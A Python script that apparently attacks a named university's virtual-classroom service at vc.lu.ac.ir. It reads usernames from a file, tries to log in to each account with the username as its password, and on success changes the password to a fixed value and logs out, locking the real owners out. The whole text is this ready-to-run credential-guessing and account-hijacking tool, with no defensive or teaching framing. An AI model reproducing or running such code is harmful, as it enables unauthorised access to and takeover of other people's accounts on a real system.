import requests
import bs4
def change_pass(login,password,newpass):
        try:
                login1 = login
                password1 = password
                newpass1 = newpass
                s = requests.Session()
                CookieUrl = s.get('http://vc.lu.ac.ir/api/xml?action=common-info')
                soup = bs4.BeautifulSoup(CookieUrl.text, 'lxml')
                cookie = soup.select('cookie')
                ClearCookie = cookie[0].getText()
                LoginUrl = 'http://vc.lu.ac.ir/api/xml?action=login&login={0}&password={1}&session={2}'.format(login1,password1,ClearCookie)
                r = s.post(LoginUrl)
                CookieUrl = s.get('http://vc.lu.ac.ir/api/xml?action=common-info')
                soup1 = bs4.BeautifulSoup(CookieUrl.text, 'lxml')
                id = soup1.find('user').get('user-id')
                ChangePassUrl = 'http://vc.lu.ac.ir/api/xml?action=user-update-pwd&user-id={0}&password-old={1}&password={2}&password-verify={3}&session={4}'.format(id,password1,newpass1,newpass1,ClearCookie)
                p = s.post(ChangePassUrl)
                print(p.content)
                print("Password Changed Successfully for : ",login1)
                print("[+]requesting to LogOut")
                LogoutUrl='http://vc.lu.ac.ir/api/xml?action=logout'
                o = requests.post(LogoutUrl)
                ClearCookie = ''
                cookie = ''
        except:
                print("invalid pass for",login)
def readlines():
        print("By Nicoteen")
        newpass = 'NaBeKelasMajazi'
        f = open('pass.txt',"r")
        for login in f:
                login = login.rstrip()
                print("Checking for",login)
                password = login
                change_pass(login,password,newpass)

readlines()

